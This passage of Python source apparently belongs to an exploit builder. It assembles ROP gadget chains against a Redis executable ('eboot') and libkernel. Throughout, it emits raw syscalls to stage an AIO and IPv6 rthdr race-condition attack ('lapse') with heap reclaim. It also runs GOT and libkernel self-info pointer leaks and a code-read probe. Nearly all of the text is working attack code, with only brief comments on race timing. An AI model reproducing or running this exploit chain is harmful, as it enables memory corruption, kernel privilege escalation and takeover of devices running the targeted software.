            emit_lapse_syscall(0x068, [("mem64", msg_addr + 0x20), msg_addr + server_addr_off, 16, 0, 0, 0], 0x30, 0x2100)
            emit_lapse_syscall(0x020, [("mem64", msg_addr + 0x20), msg_addr + server_addr_off, msg_addr + addr_len_off, 0, 0, 0], 0x38, 0x2180)
            emit_lapse_syscall(0x06A, [("mem64", msg_addr + 0x20), 1, 0, 0, 0, 0], 0x40, 0x2200)
            emit_lapse_syscall(0x061, [2, 1, 0, 0, 0, 0], 0x48, 0x2280)
            emit_lapse_syscall(0x062, [("mem64", msg_addr + 0x48), msg_addr + server_addr_off, 16, 0, 0, 0], 0x50, 0x2300)
            emit_lapse_syscall(0x01E, [("mem64", msg_addr + 0x20), 0, 0, 0, 0, 0], 0x58, 0x2380)
            emit_lapse_syscall(0x069, [("mem64", msg_addr + 0x48), 0xFFFF, 0x80, msg_addr + linger_off, 8, 0], 0x60, 0x2400, "client_fd_to_target_req")
            if lowrop_lapse_sockbuf_size:
                # These compact slots are free in the count<=4 rthdr layout.
                # Small buffers plus an immediate client write can make
                # SO_LINGER block inside the worker's fdrop/soclose path.
                emit_lapse_syscall(
                    0x069,
                    [("mem64", msg_addr + 0x48), 0xFFFF, 0x1001, msg_addr + sockbuf_off, 4, 0],
                    sockbuf_client_ret_off,
                    0x1E80,
                )
                emit_lapse_syscall(
                    0x069,
                    [("mem64", msg_addr + 0x58), 0xFFFF, 0x1002, msg_addr + sockbuf_off, 4, 0],
                    sockbuf_conn_ret_off,
                    0x1F00,
                )
            if lowrop_lapse_client_fill_len:
                emit_lapse_syscall(
                    0x004,
                    [("mem64", msg_addr + 0x48), msg_addr, lowrop_lapse_client_fill_len, 0, 0, 0],
                    client_fill_ret_off,
                    0x1F80,
                )
            emit_lapse_syscall(0x29D, [0x1001, msg_addr + reqs_off, 3, 3, msg_addr + aio_ids_off, 0], 0x68, 0x2500)
            emit_lapse_syscall(0x29A, [msg_addr + aio_ids_off, 3, msg_addr + cancel_state_off, 0, 0, 0], 0x70, 0x2580)
            emit_lapse_syscall(0x298, [msg_addr + aio_ids_off, 3, msg_addr + poll_all_state_off, 0, 0, 0], 0x78, 0x2600)
            emit_lapse_syscall(0x006, [("mem64", msg_addr + 0x48), 0, 0, 0, 0, 0], 0x80, 0x2680)
            emit_lapse_syscall(0x087, [1, 1, 0, msg_addr + barrier_pipe_off, 0, 0], 0x88, 0x2700, "barrier_socketpair_fds_to_slots")
            if lowrop_lapse_worker_ack_poll_ms and lowrop_lapse_after_ack_send:
                emit_store_imm64(msg_addr + 0x18, 12)
                emit_lapse_send_msg()
            if lowrop_lapse_uses_ack_pipe:
                emit_lapse_syscall(0x087, [1, 1, 0, msg_addr + ack_pipe_off, 0, 0], 0x118, 0x2780, "ack_socketpair_fds_to_slots")
                if lowrop_lapse_after_ack_send:
                    emit_store_imm64(msg_addr + 0x18, 12)
                    emit_lapse_send_msg()
            thread_create_segment_off = 0x2880 if lowrop_lapse_uses_ack_pipe else 0x2800
            emit_lapse_syscall(0x1C7, [msg_addr + thr_args_off, 0x68, 0, 0, 0, 0], 0x90, thread_create_segment_off)
            if lowrop_lapse_worker_ready_pipe:
                emit_lapse_syscall(0x003, [("mem64", msg_addr + ack_read_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x140, 0x2900)
            elif lowrop_lapse_worker_ready_ack:
                emit_lapse_syscall(0x003, [("mem64", msg_addr + write_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0], 0x140, 0x2780)
            if lowrop_lapse_race_rthdr:
                pre_barrier_segment_off = 0x2880
                for i in range(lowrop_lapse_pre_barrier_yields):
                    emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x180 + i * 8, pre_barrier_segment_off)
                    pre_barrier_segment_off += 0x80
                if lowrop_lapse_pre_barrier_sleep_ns:
                    emit_lapse_syscall(0x0F0, [msg_addr + pre_barrier_sleep_ts_off, 0, 0, 0, 0, 0], 0x570, pre_barrier_segment_off)
                    pre_barrier_segment_off += 0x80
                for i in range(lowrop_lapse_pre_barrier_getpid_loops):
                    emit_lapse_syscall(0x014, [0, 0, 0, 0, 0, 0], 0x5C0 + i * 8, pre_barrier_segment_off)
                    pre_barrier_segment_off += 0x80
                for i in range(lowrop_lapse_pre_barrier_rop_nops):
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    emitq(i)
            if not lowrop_lapse_race_rthdr:
                for i in range(4):
                    emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x110 + i * 8, 0x2880 + i * 0x80)
            emit_lapse_syscall(0x004, [("mem64", msg_addr + write_fd_qword_off), msg_addr + pipe_buf_off, 1, 0, 0, 0], 0x98, 0x2A80)
            main_segment_off = 0x2B00
            if lowrop_lapse_worker_after_read_ack:
                emit_lapse_syscall(
                    0x003,
                    [("mem64", msg_addr + ack_read_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0],
                    0x140,
                    main_segment_off,
                )
                main_segment_off += 0x80
            if lowrop_lapse_race_rthdr:
                for i in range(lowrop_lapse_pre_suspend_rop_nops):
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    emitq(i)
            for i in range(lowrop_lapse_pre_suspend_yields):
                emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x130 + i * 8, main_segment_off)
                main_segment_off += 0x80
            if lowrop_lapse_pre_suspend_sleep_ns:
                emit_lapse_syscall(0x0F0, [msg_addr + pre_sleep_ts_off, 0, 0, 0, 0, 0], 0x150, main_segment_off)
                main_segment_off += 0x80
            for i in range(lowrop_lapse_pre_suspend_getpid_loops):
                emit_lapse_syscall(0x014, [0, 0, 0, 0, 0, 0], 0x1C0 + i * 8, main_segment_off)
                main_segment_off += 0x80
            emit_lapse_syscall(0x278, [("mem64", msg_addr + child_tid_off), 0, 0, 0, 0, 0], 0xA0, main_segment_off)
            main_segment_off += 0x80
            if lowrop_lapse_tcpinfo_before_poll:
                emit_lapse_syscall(0x076, [("mem64", msg_addr + 0x58), 6, 0x20, msg_addr + tcp_info_off, msg_addr + tcp_info_len_off, 0], 0xB0, main_segment_off)
                main_segment_off += 0x80
            emit_lapse_syscall(0x298, [msg_addr + target_id_off, 1, msg_addr + poll_target_state_off, 0, 0, 0], 0xA8, main_segment_off)
            main_segment_off += 0x80
            if lowrop_lapse_race_rthdr:
                for i in range(lowrop_lapse_post_poll_rop_nops):
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    emitq(i)
                for i in range(lowrop_lapse_post_poll_yields):
                    emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x520 + i * 8, main_segment_off)
                    main_segment_off += 0x80
            if lowrop_lapse_conn_drain_len:
                emit_lapse_syscall(
                    0x003,
                    [
                        ("mem64", msg_addr + 0x58),
                        msg_addr + rthdr_getbuf_off,
                        lowrop_lapse_conn_drain_len,
                        0,
                        0,
                        0,
                    ],
                    conn_drain_ret_off,
                    main_segment_off,
                )
                main_segment_off += 0x80
            if not lowrop_lapse_tcpinfo_before_poll:
                emit_lapse_syscall(0x076, [("mem64", msg_addr + 0x58), 6, 0x20, msg_addr + tcp_info_off, msg_addr + tcp_info_len_off, 0], 0xB0, main_segment_off)
                main_segment_off += 0x80
            if lowrop_lapse_pre_delete_send:
                emit_store_imm64(msg_addr + 0x18, 3)
                emit_lapse_send_msg()
            emit_lapse_syscall(0x296, [msg_addr + target_id_off, 1, msg_addr + main_state_off, 0, 0, 0], 0xB8, main_segment_off)
            main_segment_off += 0x80
            if lowrop_lapse_post_main_delete_send:
                emit_store_imm64(msg_addr + 0x18, 4)
                emit_lapse_send_msg()
            emit_lapse_syscall(0x279, [("mem64", msg_addr + child_tid_off), 0, 0, 0, 0, 0], 0xC0, main_segment_off)
            if not lowrop_lapse_race_rthdr:
                for i in range(6):
                    emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x130 + i * 8, 0x2D80 + i * 0x80)
                emit_lapse_syscall(0x006, [("mem64", msg_addr + 0x58), 0, 0, 0, 0, 0], 0xC8, 0x3100)
                emit_lapse_syscall(0x006, [("mem64", msg_addr + 0x20), 0, 0, 0, 0, 0], 0xD0, 0x3180)
            if lowrop_lapse_race_rthdr:
                segment_off = rthdr_segment_off
                if lowrop_lapse_worker_ack:
                    emit_lapse_syscall(
                        0x003,
                        [("mem64", msg_addr + ack_read_fd_qword_off), msg_addr + ack_buf_off, 1, 0, 0, 0],
                        0x120,
                        segment_off,
                    )
                    segment_off += rthdr_segment_stride
                elif lowrop_lapse_worker_ack_poll_ms:
                    emit_lapse_syscall(
                        0x0D1,
                        [msg_addr + ack_pollfd_off, 1, lowrop_lapse_worker_ack_poll_ms, 0, 0, 0],
                        0x120,
                        segment_off,
                    )
                    segment_off += rthdr_segment_stride
                for i in range(lowrop_lapse_post_resume_yields):
                    emit_lapse_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0xC8 + i * 8, segment_off)
                    segment_off += rthdr_segment_stride
                if lowrop_lapse_post_resume_sleep_ns:
                    emit_lapse_syscall(0x0F0, [msg_addr + sleep_ts_off, 0, 0, 0, 0, 0], 0x158, segment_off)
                    segment_off += rthdr_segment_stride
                if lowrop_lapse_pre_reclaim_send:
                    # Snapshot the race outcome before the rthdr reclaim stage.
                    # If reclaim destabilizes Redis, raw_del_capture still gets
                    # this buffer and the checker can tune race timing.
                    emit_store_imm64(msg_addr + 0x18, 1)
                    emit_lapse_send_msg()
                for i in range(lowrop_lapse_post_resume_rop_nops):
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    emitq(i)
                if not lowrop_lapse_rthdr_skip_reclaim:
                    for _ in range(lowrop_lapse_rthdr_set_loops):
                        for i in range(rthdr_count):
                            setbuf_addr = msg_addr + rthdr_buf_off
                            if lowrop_lapse_rthdr_per_socket_setbuf:
                                setbuf_addr = msg_addr + rthdr_getbuf_off + i * 0x80
                            else:
                                emit_store_imm64(msg_addr + rthdr_buf_off + 4, i + 1)
                            emit_lapse_syscall(
                                0x069,
                                [("mem64", msg_addr + rthdr_sds_off + i * 8), 41, 51, setbuf_addr, 0x78, 0],
                                rthdr_set_ret_off + i * 8,
                                segment_off,
                            )
                            segment_off += rthdr_segment_stride
                    for i in range(rthdr_count):
                        if not lowrop_lapse_skip_rthdr_optlen_store:
                            emit_store_imm64(msg_addr + rthdr_optlen_off + i * 8, 0x80)
                        emit_lapse_syscall(
                            0x076,
                            [
                                ("mem64", msg_addr + rthdr_sds_off + i * 8),
                                41,
                                51,
                                msg_addr + rthdr_getbuf_off + i * 0x80,
                                msg_addr + rthdr_optlen_off + i * 8,
                                0,
                            ],
                            rthdr_get_ret_off + i * 8,
                            segment_off,
                            ("copy_rthdr_marker", i),
                        )
                        segment_off += rthdr_segment_stride
                    if lowrop_lapse_post_reclaim_send:
                        emit_store_imm64(msg_addr + 0x18, 2)
                        emit_lapse_send_msg()

        elif lowrop_lapse_rthdr_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            rthdr_count = lowrop_lapse_rthdr_count
            rthdr_layout = lapse_rthdr_layout(
                rthdr_count,
                0x300,
                0,
                lowrop_lapse_rthdr_set_loops,
            )
            rthdr_sds_off = rthdr_layout["sds_off"]
            rthdr_set_ret_off = rthdr_layout["set_ret_off"]
            rthdr_get_ret_off = rthdr_layout["get_ret_off"]
            rthdr_marker_off = rthdr_layout["marker_off"]
            rthdr_optlen_off = rthdr_layout["optlen_off"]
            rthdr_buf_off = rthdr_layout["rthdr_buf_off"]
            rthdr_getbuf_off = rthdr_layout["getbuf_off"]
            rthdr_segment_off = rthdr_layout["segment_off"]
            rthdr_segment_stride = rthdr_layout["segment_stride"]

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_main_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_lapse_syscall(sysno, supplied, result_off, segment_off, post_ops=None):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_main_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def sq(value):
                    segment.extend(pack64(value))

                def sdword(src_addr, dst_addr):
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(src_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(dst_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)

                sq(0)
                sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                sq(msg_addr + result_off)
                sq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if isinstance(post_ops, tuple) and post_ops[0] == "copy_rthdr_marker":
                    idx = post_ops[1]
                    sdword(msg_addr + rthdr_getbuf_off + idx * 0x80 + 4, msg_addr + rthdr_marker_off + idx * 8)
                sq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                sq(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            segment_off = rthdr_segment_off
            for i in range(rthdr_count):
                emit_lapse_syscall(0x061, [28, 2, 17, 0, 0, 0], rthdr_sds_off + i * 8, segment_off)
                segment_off += rthdr_segment_stride
            for _ in range(lowrop_lapse_rthdr_set_loops):
                for i in range(rthdr_count):
                    emit_store_imm64(msg_addr + rthdr_buf_off + 4, i + 1)
                    emit_lapse_syscall(
                        0x069,
                        [("mem64", msg_addr + rthdr_sds_off + i * 8), 41, 51, msg_addr + rthdr_buf_off, 0x78, 0],
                        rthdr_set_ret_off + i * 8,
                        segment_off,
                    )
                    segment_off += rthdr_segment_stride
            for i in range(rthdr_count):
                emit_store_imm64(msg_addr + rthdr_optlen_off + i * 8, 0x80)
                emit_lapse_syscall(
                    0x076,
                    [
                        ("mem64", msg_addr + rthdr_sds_off + i * 8),
                        41,
                        51,
                        msg_addr + rthdr_getbuf_off + i * 0x80,
                        msg_addr + rthdr_optlen_off + i * 8,
                        0,
                    ],
                    rthdr_get_ret_off + i * 8,
                    segment_off,
                    ("copy_rthdr_marker", i),
                )
                segment_off += rthdr_segment_stride

        elif lowrop_lapse_worker_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            active_pipe_off = 0x200
            req_off = 0x220
            aio_id_off = 0x260
            poll_state_off = 0x270
            worker_state_off = 0x274
            rtprio_off = 0x280
            cpumask_off = 0x288
            thr_args_off = 0x580
            child_tid_off = 0x610
            parent_tid_off = 0x618
            thread_stack_off = 0x700
            thread_stack_size = 0x800
            thread_rop_off = 0x1000
            tls_off = 0x2700
            tls_size = 0x80
            worker_segments = []

            struct.pack_into("<I", msg, cpumask_off, 1 << 4)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
            struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size + 8, msg_addr + thread_rop_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x00, args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
            struct.pack_into("<Q", msg, thr_args_off + 0x08, 0)
            struct.pack_into("<Q", msg, thr_args_off + 0x10, msg_addr + thread_stack_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x18, thread_stack_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x20, msg_addr + tls_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x28, tls_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x30, msg_addr + child_tid_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x38, msg_addr + parent_tid_off)

            thread = bytearray()

            def thread_q(value):
                thread.extend(pack64(value))

            def thread_pop_rdx_padded(value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread.extend(b"ROP")
                thread_q(0)

            def thread_store_imm64(dst_addr, value):
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                thread_q(dst_addr)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(value)
                thread_q(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def thread_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                worker_segments.append(segment_off)

                thread_q(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                thread_q(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                thread_q(0)
                thread_q(0)
                thread_q(0)
                thread_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                thread_q(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                thread_q(supplied[0] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                thread_q(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                thread_q(sysno & 0xFFFFFFFFFFFFFFFF)
                thread_q(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                thread_q(segment_addr)

                resume_addr = msg_addr + thread_rop_off + len(thread)
                segment = bytearray()
                for q in (
                    0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + result_off,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RSP_RET,
                    resume_addr,
                ):
                    segment.extend(pack64(q))
                msg[segment_off:segment_off + len(segment)] = segment

            thread_syscall(0x1E8, [3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, msg_addr + cpumask_off, 0], 0x80, 0x1400)
            thread_syscall(0x1D2, [1, 0, msg_addr + rtprio_off, 0, 0, 0], 0x88, 0x1480)
            thread_store_imm64(msg_addr + 0x38, 1)
            thread_syscall(0x296, [msg_addr + aio_id_off, 1, msg_addr + worker_state_off, 0, 0, 0], 0x90, 0x1500)
            thread_store_imm64(msg_addr + 0x40, 1)
            thread_syscall(0x1AF, [0, 0, 0, 0, 0, 0], 0x98, 0x1580)
            msg[thread_rop_off:thread_rop_off + len(thread)] = thread

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            for segment_off in worker_segments:
                emit_store_qword(msg_addr + segment_off, msg_addr + 0x08)

            def emit_worker_syscall(sysno, supplied, result_off, segment_off, post_ops=None):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(supplied[0] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def sq(value):
                    segment.extend(pack64(value))

                sq(0)
                sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                sq(msg_addr + result_off)
                sq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if post_ops == "pipe_fd_to_aio_req":
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(msg_addr + active_pipe_off)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(msg_addr + req_off + 0x20)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)
                sq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                sq(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            emit_worker_syscall(0x087, [1, 1, 0, msg_addr + active_pipe_off, 0, 0], 0x20, 0x1800, "pipe_fd_to_aio_req")
            emit_worker_syscall(0x29D, [1, msg_addr + req_off, 1, 3, msg_addr + aio_id_off, 0], 0x30, 0x1880)
            emit_worker_syscall(0x1C7, [msg_addr + thr_args_off, 0x68, 0, 0, 0, 0], 0x48, 0x1900)
            for i in range(8):
                emit_worker_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0xA0 + i * 8, 0x1980 + i * 0x80)
            emit_worker_syscall(0x298, [msg_addr + aio_id_off, 1, msg_addr + poll_state_off, 0, 0, 0], 0x60, 0x1D80)

        elif lowrop_code_read_probe:
            source_offsets = {
                ("kernel", "getpid"): LIBKERNEL_GETPID,
                ("kernel", "gettimeofday"): LIBKERNEL_GETTIMEOFDAY,
                ("kernel", "send"): 0x12660,
                ("sys", "getpid"): LIBKERNEL_SYS_GETPID,
                ("sys", "gettimeofday"): LIBKERNEL_SYS_GETTIMEOFDAY,
                ("sys", "send"): LIBKERNEL_SYS_SEND_EXPORT,
            }
            direct_gots = {
                "getpid": REDIS_EBOOT_GETPID_GOT,
                "gettimeofday": REDIS_EBOOT_GETTIMEOFDAY_GOT,
                "send": 0x126538,
                "sceKernelDlsym": 0x1262C8,
                "memcpy": REDIS_EBOOT_MEMCPY_GOT,
            }
            if args.lowrop_code_read_source in ("libc-getpid", "libc-gettimeofday"):
                source_name = args.lowrop_code_read_source.split("-", 1)[1]
            else:
                source_name = args.lowrop_code_read_source
            source_off = source_offsets.get((args.lowrop_code_read_flavor, source_name), 0)
            if args.lowrop_code_read_source in ("sceKernelDlsym", "memcpy"):
                source_off = 0
            wrapper_offset = args.lowrop_code_read_wrapper_offset
            if wrapper_offset is None:
                wrapper_offset = source_off

            struct.pack_into("<Q", msg, 0x10, code_read_len)
            struct.pack_into("<Q", msg, 0x18, source_off & 0xFFFFFFFFFFFFFFFF)
            struct.pack_into("<Q", msg, 0x20, wrapper_offset & 0xFFFFFFFFFFFFFFFF)
            struct.pack_into("<Q", msg, 0x28, args.lowrop_code_read_adjust & 0xFFFFFFFFFFFFFFFF)
            struct.pack_into("<Q", msg, 0x38, msg_addr + code_copy_off)

            def emit_load_code_read_source():
                if args.lowrop_code_read_source == "msg":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                    emitq(msg_addr)
                    return
                if args.lowrop_code_read_source == "libc-getpid":
                    qdelta = (LIBC_GETPID_GOT - LIBC_MEMCPY_EXPORT) // 8
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_pop_rdx_padded(qdelta)
                    emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    return
                if args.lowrop_code_read_source == "libc-gettimeofday":
                    qdelta = (LIBC_GETTIMEOFDAY_GOT - LIBC_MEMCPY_EXPORT) // 8
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_pop_rdx_padded(qdelta)
                    emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    return
                got_off = direct_gots[args.lowrop_code_read_source]
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + got_off)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            emit_load_code_read_source()
            emit_store_rax(msg_addr)

            target_delta = wrapper_offset - source_off
            if target_delta:
                if source_off == 0:
                    raise RuntimeError("code-read wrapper-offset needs a known source offset")
                if target_delta % 8:
                    raise RuntimeError("--lowrop-code-read-wrapper-offset delta must be qword-aligned")
                emit_pop_rdx_padded((target_delta // 8) & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
            if args.lowrop_code_read_adjust:
                emit_pop_rdx_padded(args.lowrop_code_read_adjust & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)

            emit_store_rax(msg_addr + 0x08)
            emit_rax_to_rsi()
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + code_copy_off)
            emit_pop_rdx_padded(code_read_len)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_MEMCPY_PLT)
            emit_store_rax(msg_addr + 0x30)

        elif lowrop_self_info_leak:
            if args.lowrop_self_dlsym_flavor == "kernel":
                qwords_from_getpid_to_self_ptr = (
                    LIBKERNEL_SELF_INFO_PTR - LIBKERNEL_GETPID
                ) // 8
            else:
                qwords_from_getpid_to_self_ptr = (
                    LIBKERNEL_SYS_SELF_INFO_PTR - LIBKERNEL_SYS_GETPID
                ) // 8

            # msg+0 = live getpid wrapper pointer.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # msg+8 = computed address of libkernel[_sys] SELF_INFO_PTR.
            emit_pop_rdx_padded(qwords_from_getpid_to_self_ptr)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 8)
